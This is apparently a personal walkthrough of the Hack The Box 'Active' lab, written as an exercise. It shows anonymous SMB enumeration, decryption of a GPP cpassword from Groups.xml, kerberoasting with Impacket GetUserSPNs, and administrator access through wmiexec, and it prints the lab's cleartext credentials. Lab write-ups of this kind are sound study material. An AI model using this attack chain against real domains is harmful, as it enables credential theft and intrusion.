```bash
sudo nmap -sV -sC 10.129.104.132

```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 09:31 CST
Nmap scan report for 10.129.104.132
Host is up (0.0085s latency).
Not shown: 983 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-23 15:31:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-23T15:32:30
|_  start_date: 2025-01-23T15:29:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

```

```bash
smbclient -N //10.129.104.132/Replication
```

```bash
smbmap -R Replication -H 10.129.104.132
```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/668453a2-4d8e-409c-9b14-4995ce6d786f/7f02d19f-e1fd-4173-91f6-80d10b392111/image.png)

After seeing these files on the walkthrough it shows a groups.xml which i could see so i used the following to download all

```bash
smbclient -N //10.129.104.132/Replication

Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *

```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/668453a2-4d8e-409c-9b14-4995ce6d786f/e30cc1dc-5212-4c7c-9b8c-760ee5120f90/image.png)

in truth for whatever reason i coldnt get the file > so i had to grab online 

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-
8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06"
uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName=""
description=""
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw
/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0"
userName="a

In this xml we find the username and a encrypted passsword,m after decriptopnm 

```bash
gpp-decrypt
edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

WE GOT DAT PASSWORD, NOW LETS GET INTO THAT USERS SMB

```bash
smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //10.129.104.132/Users
```

User flag:

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/668453a2-4d8e-409c-9b14-4995ce6d786f/de704f63-db4a-46ab-b535-95f3b24d95a6/image.png)

To use this account for further compromise we can use impacket to enumerate more users

```bash
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.129.104.132
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Querying 10.129.104.132 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 14:06:40.351723  2025-01-23 09:30:08.494960 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 13:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 15:14:38.402764  2018-07-21 09:01:30.320277 

```

okay so, we try now using impacket to see what users have SPN enabled hinting at kerberoasting vulns with thwe following

```bash
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.129.104.132

```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/668453a2-4d8e-409c-9b14-4995ce6d786f/b74c68ca-82f8-48b9-9cf3-1f11a8817419/image.png)

We see admin has it enabled!

The following command allows us to grab the hash

```bash
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.129.104.132 -request

```

After cracking this we used 

```bash
wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.104.132

```

then grabbed root! very cool!
